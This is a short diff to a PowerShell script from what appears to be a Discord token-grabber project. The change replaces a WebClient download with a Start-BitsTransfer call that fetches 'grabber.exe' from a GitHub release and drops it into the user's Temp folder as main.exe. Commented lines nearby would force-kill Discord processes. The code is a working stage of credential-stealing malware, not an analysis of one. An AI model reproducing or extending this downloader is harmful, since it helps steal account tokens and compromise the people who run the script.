@@ -854,7 +854,7 @@ function Backup-Data {
     #}
     #catch {}
 
-    (New-Object System.Net.WebClient).DownloadFile("https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/AutoBuild/grabber.exe", "$env:LOCALAPPDATA\Temp\main.exe")
+    Start-BitsTransfer -Source "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/AutoBuild/grabber.exe" -Destination "$env:LOCALAPPDATA\Temp\main.exe"
 
     #Stop-Process -Name "discord" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
     #Stop-Process -Name "discordcanary" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
